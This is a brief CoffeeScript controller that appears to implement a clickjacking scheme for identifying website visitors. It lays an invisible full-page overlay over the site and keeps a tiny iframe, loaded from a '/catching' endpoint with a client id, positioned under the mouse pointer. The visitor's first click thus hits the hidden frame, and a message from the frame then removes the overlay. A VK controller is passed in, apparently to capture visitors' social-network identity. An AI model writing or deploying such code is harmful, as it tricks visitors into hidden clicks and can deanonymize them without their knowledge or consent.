class @VisitorsController

  #host: 'http://converzilla.kerweb.ru'
  host: 'http://localhost:3000'

  constructor: (clientId, vkController)->
    @clientId = clientId

    $('body').append "<div id='overlay'style='width: 100%;height: 100%;position: absolute;top: 0;left: 0;cursor: pointer;z-index: 100;'>
    	<div id='wrap1' style='overflow: hidden;width: 20px;height: 10px;opacity: 1;position: absolute;z-index: 101;'>
    		<div id='wrap2' style='margin-top: -5px;margin-left: -5px;'>
    			<iframe src='#{@host}/catching?id=#{@clientId}'></iframe>
    	</div>
    </div>"
    $(window).on 'mousemove', (e) ->
      $('#wrap1').css {left:  e.pageX - 20, top:   e.pageY - 12 }

    eventMethod = window.addEventListener ? "addEventListener" : "attachEvent"
    eventer = window[eventMethod]
    messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message"

    eventer(messageEvent, (e) =>
      console.log('parent received message!:  ', e.data)
      $('#overlay').remove()
    , false);
